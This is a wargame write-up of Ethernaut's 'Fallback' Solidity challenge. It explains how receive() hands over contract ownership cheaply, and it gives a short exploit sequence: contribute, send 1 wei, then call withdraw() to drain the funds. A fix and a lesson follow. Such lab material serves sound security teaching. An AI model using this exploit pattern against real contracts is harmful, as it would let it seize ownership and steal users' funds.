# Fallback (Ethernaut #1)

**Vulnerability class:** Weak access control — a side-door to ownership.

## The target

The `Fallback` contract guards `withdraw()` with an `onlyOwner` modifier, so at
first glance the funds look safe. The real question is not *"is withdraw
protected?"* but *"how does one become owner in the first place, and is every
path to that privilege protected?"*

There are two places where `owner` is assigned:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;   // path 1: requires beating 1000 ETH in <0.001 ETH steps — infeasible
    }
}

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;        // path 2: trivial conditions
}
```

## The flaw

`receive()` hands over ownership with trivial conditions: send any non-zero
amount of ETH, having contributed any non-zero amount once before. It completely
ignores the 1000-ETH contribution that is supposed to protect ownership.

## The exploit

```solidity
// 1. Contribute a tiny amount so contributions[attacker] > 0
target.contribute{value: 0.0005 ether}();

// 2. Send ETH directly, triggering receive() -> become owner
(bool ok, ) = address(target).call{value: 1 wei}("");
require(ok);

// 3. As owner, drain the contract
target.withdraw();
```

The Foundry test asserts the attacker is not owner initially, becomes owner after
step 2, and that the vault balance reaches zero after `withdraw()`.

## The fix

The `receive()` function should never assign ownership. Ownership transfer, if
needed at all, belongs in an explicit, access-controlled function. A plain ETH
receive should at most record a contribution — never grant a privilege.

## Lesson

Protecting the *use* of a privilege (`onlyOwner` on `withdraw`) is worthless if
another function gives the privilege away cheaply. Always trace **every** path
to a sensitive role, not just the obvious one.
